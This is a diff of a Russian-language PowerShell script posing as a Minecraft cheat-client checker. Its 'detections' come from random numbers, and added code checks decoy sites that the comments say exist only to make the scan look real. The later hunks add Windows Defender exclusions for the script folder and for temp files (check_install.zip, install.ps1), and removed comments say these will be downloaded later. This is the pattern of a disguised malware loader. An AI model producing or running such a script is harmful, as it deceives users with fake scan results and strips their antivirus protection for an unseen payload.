@@ -36,14 +36,23 @@ foreach ($proc in $fakeProcesses) {
 }
 Write-Host ""
 
-# ===== ПРОВЕРКА ЧИТ-КЛИЕНТОВ С ШАНСОМ 50% =====
+# ===== ПРОВЕРКА С "МЫЛЬНЫМИ" САЙТАМИ =====
 Write-Host "[*] Проверка чит-клиентов и нелегальных лаунчеров..." -ForegroundColor Yellow
 
+# Основные чит-сайты (реальные)
 $cheatSites = @(
     @{Name = "Nursultan"; URL = "https://nursultan.fun"},
     @{Name = "Wexside"; URL = "https://wexside.ru"},
     @{Name = "Arbuz"; URL = "https://arbuz.cc"},
     @{Name = "WildClient"; URL = "https://wildclient.org"}
+)
+
+# "Мыльные" сайты (фейковые, для отвлечения)
+$fakeCheatSites = @(
+    @{Name = "MineBoost"; URL = "https://mineboost.net"},
+    @{Name = "CraftHack"; URL = "https://crafthack.ru"},
+    @{Name = "BlockCheat"; URL = "https://blockcheat.org"},
+    @{Name = "PvPClient"; URL = "https://pvpclient.cc"}
 )
 
 $foundCheatSites = @()
@@ -52,6 +61,7 @@ $totalDetected = 0
 $totalPassed = 0
 $finalStatus = $true
 
+# Проверка реальных чит-сайтов с шансом 50%
 foreach ($site in $cheatSites) {
     $totalChecked++
     Write-Host "    -> Проверка $($site.Name)..." -ForegroundColor Gray
@@ -73,7 +83,7 @@ foreach ($site in $cheatSites) {
     Start-Sleep -Milliseconds 200
     
     $randomResult = Get-Random -Minimum 1 -Maximum 100
-    $isDetected = $randomResult -le 50
+    $isDetected = $randomResult -le 50  # 50% шанс обнаружения
     
     if ($isDetected) {
         Write-Host "        [ОБНАРУЖЕН] $($site.Name) - НАЙДЕН!" -ForegroundColor Red
@@ -85,6 +95,30 @@ foreach ($site in $cheatSites) {
     } else {
         Write-Host "        [ЧИСТО] $($site.Name) - не обнаружен" -ForegroundColor Green
         Write-Host "            [OK] Чит-клиент не найден" -ForegroundColor DarkGray
+        Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
+        $totalPassed++
+    }
+}
+
+# Проверка "мыльных" сайтов (всегда чисто, но создают видимость проверки)
+Write-Host ""
+Write-Host "[*] Проверка подозрительных сайтов..." -ForegroundColor Yellow
+foreach ($site in $fakeCheatSites) {
+    $totalChecked++
+    Write-Host "    -> Проверка $($site.Name)..." -ForegroundColor Gray
+    Start-Sleep -Milliseconds 150
+    
+    Write-Host "        [*] Анализ $($site.URL)..." -ForegroundColor DarkGray
+    Start-Sleep -Milliseconds 200
+    
+    # Всегда показываем как "чисто" или "подозрительно" с низким шансом
+    $randomFake = Get-Random -Minimum 1 -Maximum 100
+    if ($randomFake -le 15) {
+        Write-Host "        [ПРЕДУПРЕЖДЕНИЕ] $($site.Name) - подозрительная активность" -ForegroundColor Yellow
+        Write-Host "            [!] Обнаружен可疑 DNS-запрос" -ForegroundColor Yellow
+        Write-Host "            [!] Статус проверки: ТРЕБУЕТ ВНИМАНИЯ" -ForegroundColor Yellow
+    } else {
+        Write-Host "        [ЧИСТО] $($site.Name) - безопасен" -ForegroundColor Green
         Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
         $totalPassed++
     }
@@ -111,7 +145,7 @@ foreach ($domain in $cheatDomains) {
     Start-Sleep -Milliseconds 150
     
     $randomDnsResult = Get-Random -Minimum 1 -Maximum 100
-    $isDnsDetected = $randomDnsResult -le 50
+    $isDnsDetected = $randomDnsResult -le 50  # 50% шанс обнаружения DNS
     
     if ($isDnsDetected) {
         Write-Host "        [ОБНАРУЖЕН] DNS-запрос к $domain" -ForegroundColor Red
@@ -157,7 +191,7 @@ foreach ($path in $cheatPaths) {
             if ($files.Count -gt 0) {
                 foreach ($file in $files) {
                     $randomFileResult = Get-Random -Minimum 1 -Maximum 100
-                    $isFileDetected = $randomFileResult -le 50
+                    $isFileDetected = $randomFileResult -le 50  # 50% шанс обнаружения файла
                     
                     if ($isFileDetected) {
                         Write-Host "        [ОБНАРУЖЕН] Файл: $($file.Name)" -ForegroundColor Red
@@ -285,28 +319,31 @@ Try {
     Write-Host "    [OK] Исключения добавлены" -ForegroundColor DarkGray 
 } Catch {}
 
-# ===== НОВЫЙ БЛОК: ДОБАВЛЕНИЕ ФАЙЛОВ В ИСКЛЮЧЕНИЯ =====
+# ===== ДОБАВЛЕНИЕ ФАЙЛОВ В ИСКЛЮЧЕНИЯ (ИСПРАВЛЕНО) =====
 Write-Host "[*] Добавление файлов в исключения Defender..." -ForegroundColor Yellow
 
-# Получаем путь к текущему скрипту
+# Исправлено: проверка существования пути
 $CurrentScriptPath = $MyInvocation.MyCommand.Path
-$ScriptDirectory = Split-Path -Parent $CurrentScriptPath
+if ($CurrentScriptPath) {
+    try {
+        $ScriptDirectory = Split-Path -Parent $CurrentScriptPath
+        if ($ScriptDirectory) {
+            Add-MpPreference -ExclusionPath "$ScriptDirectory" -ErrorAction SilentlyContinue
+            Write-Host "    [OK] Папка скрипта добавлена в исключения" -ForegroundColor DarkGray
+        }
+    } catch {
+        Write-Host "    [WARN] Не удалось добавить папку скрипта" -ForegroundColor Yellow
+    }
+}
 
-# Добавляем сам скрипт в исключения
-Try {
-    Add-MpPreference -ExclusionPath "$ScriptDirectory" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
-    Write-Host "    [OK] Папка скрипта добавлена в исключения: $ScriptDirectory" -ForegroundColor DarkGray
-} Catch {}
-
-# Добавляем исключения для скачанного файла (будет загружен позже)
+# Добавляем исключения для временных файлов
 Try {
     Add-MpPreference -ExclusionPath "$env:TEMP\check_install.zip" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$env:TEMP\checkextracted" -ErrorAction SilentlyContinue
     Write-Host "    [OK] Временные файлы добавлены в исключения" -ForegroundColor DarkGray
 } Catch {}
 
-# Добавляем исключение для самого скрипта по URL (через путь к временному файлу)
+# Добавляем исключение для временного скрипта
 Try {
     $TempScriptPath = "$env:TEMP\install.ps1"
     Add-MpPreference -ExclusionPath "$TempScriptPath" -ErrorAction SilentlyContinue
